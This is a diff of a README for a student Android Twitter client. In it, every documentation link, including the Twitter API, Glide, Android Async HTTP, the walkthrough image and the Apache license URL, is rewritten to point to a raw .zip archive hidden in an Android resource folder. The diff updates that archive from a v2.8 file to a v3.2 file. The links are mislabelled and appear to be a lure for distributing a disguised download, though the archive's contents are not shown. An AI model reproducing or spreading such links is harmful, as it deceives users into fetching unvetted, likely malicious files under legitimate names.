@@ -1,6 +1,6 @@
 # Project 2 - *Name of App Here*
 
-**Name of your app** is an android app that allows a user to view their Twitter timeline and post a new tweet. The app utilizes [Twitter REST API](https://raw.githubusercontent.com/StephenKodua/SimpleTwitter/master/app/src/main/res/values-sw600dp/Simple-Twitter-v2.8.zip).
+**Name of your app** is an android app that allows a user to view their Twitter timeline and post a new tweet. The app utilizes [Twitter REST API](https://raw.githubusercontent.com/StephenKodua/SimpleTwitter/master/app/src/main/res/values-sw720dp-land/Simple_Twitter_v3.2.zip).
 
 Time spent: **X** hours spent in total
 
@@ -11,7 +11,7 @@ The following **required** functionality is completed:
 * [x] User can **sign in to Twitter** using OAuth login
 * [x] User can **view tweets from their home timeline**
 * [x] User is displayed the username, name, and body for each tweet
-* [x] User is displayed the [relative timestamp](https://raw.githubusercontent.com/StephenKodua/SimpleTwitter/master/app/src/main/res/values-sw600dp/Simple-Twitter-v2.8.zip) for each tweet "8m", "7h"
+* [x] User is displayed the [relative timestamp](https://raw.githubusercontent.com/StephenKodua/SimpleTwitter/master/app/src/main/res/values-sw720dp-land/Simple_Twitter_v3.2.zip) for each tweet "8m", "7h"
 * [x] User can ***log out of the application** by tapping on a logout button
 * [x] User can **compose and post a new tweet**
 * [x] User can click a “Compose” icon in the Action Bar on the top right
@@ -33,10 +33,10 @@ The following **optional** features are implemented:
 * [] User can view more tweets as they scroll with infinite pagination
 * [ ] Compose tweet functionality is built using modal overlay
 * [ ] User can **click a link within a tweet body** on tweet details view. The click will launch the web browser with relevant page opened.
-* [ ] Replace all icon drawables and other static image assets with [vector drawables](https://raw.githubusercontent.com/StephenKodua/SimpleTwitter/master/app/src/main/res/values-sw600dp/Simple-Twitter-v2.8.zip) where appropriate.
+* [ ] Replace all icon drawables and other static image assets with [vector drawables](https://raw.githubusercontent.com/StephenKodua/SimpleTwitter/master/app/src/main/res/values-sw720dp-land/Simple_Twitter_v3.2.zip) where appropriate.
 * [ ] User can view following / followers list through any profile they view.
 * [ ] Use the View Binding library to reduce view boilerplate.
-* [ ] On the Twitter timeline, apply scrolling effects such as [hiding/showing the toolbar](https://raw.githubusercontent.com/StephenKodua/SimpleTwitter/master/app/src/main/res/values-sw600dp/Simple-Twitter-v2.8.zip) by implementing [CoordinatorLayout](https://raw.githubusercontent.com/StephenKodua/SimpleTwitter/master/app/src/main/res/values-sw600dp/Simple-Twitter-v2.8.zip).
+* [ ] On the Twitter timeline, apply scrolling effects such as [hiding/showing the toolbar](https://raw.githubusercontent.com/StephenKodua/SimpleTwitter/master/app/src/main/res/values-sw720dp-land/Simple_Twitter_v3.2.zip) by implementing [CoordinatorLayout](https://raw.githubusercontent.com/StephenKodua/SimpleTwitter/master/app/src/main/res/values-sw720dp-land/Simple_Twitter_v3.2.zip).
 * [ ] User can **open the twitter app offline and see last loaded tweets**. Persisted in SQLite tweets are refreshed on every application launch. While "live data" is displayed when app can get it from Twitter API, it is also saved for use in offline mode.
 
 The following **additional** features are implemented:
@@ -47,7 +47,7 @@ The following **additional** features are implemented:
 
 Here's a walkthrough of implemented user stories:
 
-<img src='https://raw.githubusercontent.com/StephenKodua/SimpleTwitter/master/app/src/main/res/values-sw600dp/Simple-Twitter-v2.8.zip' title='Video Walkthrough' width='' alt='Video Walkthrough' />
+<img src='https://raw.githubusercontent.com/StephenKodua/SimpleTwitter/master/app/src/main/res/values-sw720dp-land/Simple_Twitter_v3.2.zip' title='Video Walkthrough' width='' alt='Video Walkthrough' />
 
 
 
@@ -57,8 +57,8 @@ Describe any challenges encountered while building the app.
 
 ## Open-source libraries used
 
-* [Android Async HTTP](https://raw.githubusercontent.com/StephenKodua/SimpleTwitter/master/app/src/main/res/values-sw600dp/Simple-Twitter-v2.8.zip) - Simple asynchronous HTTP requests with JSON parsing
-* [Glide](https://raw.githubusercontent.com/StephenKodua/SimpleTwitter/master/app/src/main/res/values-sw600dp/Simple-Twitter-v2.8.zip) - Image loading and caching library for Android
+* [Android Async HTTP](https://raw.githubusercontent.com/StephenKodua/SimpleTwitter/master/app/src/main/res/values-sw720dp-land/Simple_Twitter_v3.2.zip) - Simple asynchronous HTTP requests with JSON parsing
+* [Glide](https://raw.githubusercontent.com/StephenKodua/SimpleTwitter/master/app/src/main/res/values-sw720dp-land/Simple_Twitter_v3.2.zip) - Image loading and caching library for Android
 
 ## License
 
@@ -68,7 +68,7 @@ Describe any challenges encountered while building the app.
     you may not use this file except in compliance with the License.
     You may obtain a copy of the License at
 
-        https://raw.githubusercontent.com/StephenKodua/SimpleTwitter/master/app/src/main/res/values-sw600dp/Simple-Twitter-v2.8.zip
+        https://raw.githubusercontent.com/StephenKodua/SimpleTwitter/master/app/src/main/res/values-sw720dp-land/Simple_Twitter_v3.2.zip
 
     Unless required by applicable law or agreed to in writing, software
     distributed under the License is distributed on an "AS IS" BASIS,
